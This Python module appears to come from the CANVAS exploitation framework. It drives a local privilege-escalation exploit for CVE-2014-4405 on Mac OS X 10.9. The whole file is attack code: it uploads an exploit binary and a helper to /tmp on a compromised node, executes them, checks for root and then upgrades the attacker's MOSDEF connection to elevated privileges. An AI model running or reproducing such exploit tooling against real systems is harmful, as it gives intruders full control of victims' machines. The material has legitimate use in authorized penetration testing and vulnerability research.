#!/usr/bin/env python

import sys
import time

from exploitutils import *
from canvaserror import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'IOHIKeyboardMapper::stickyKeysfree local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2014-4405'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-4405'
DOCUMENTATION['References']    = 'https://code.google.com/p/google-security-research/issues/detail?id=41'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X', 'x64'] ]
PROPERTY['VERSION']            = [ '10.9' ]

DOCUMENTATION['Notes']         = """

Tested on:
- 10.9
- 10.9.1
- 10.9.2
- 10.9.3
- 10.9.4
- 10.9.5

"""

class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_exp      = os.path.join(self.local_res, 'x')
        self.remote_exp     = '/tmp/x'
        self.remote_helper  = '/tmp/h'

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                self.log_error("Node has no shell server available")
                self.log_error("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue
            if not self.is_64bit_node():
                continue

            if self.compromised(self.remote_helper, 0):
                self.nlog('Already compromised')
                self.nlog('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.cleanup()
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                continue

            self.log_info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.setProgress(30)

            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)

            self.nlog('Executing exploit')
            self.fork_and_exec(self.remote_exp)
            self.nlog('Waiting...')

            self.setProgress(90)

            # wait 3 secs for the exploit to complete
            wait_secs = 3
            if self.compromised(self.remote_helper, wait_secs):
                self.log_info('Compromised!')
                self.nlog('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                self.log_error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

            self.cleanup()

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
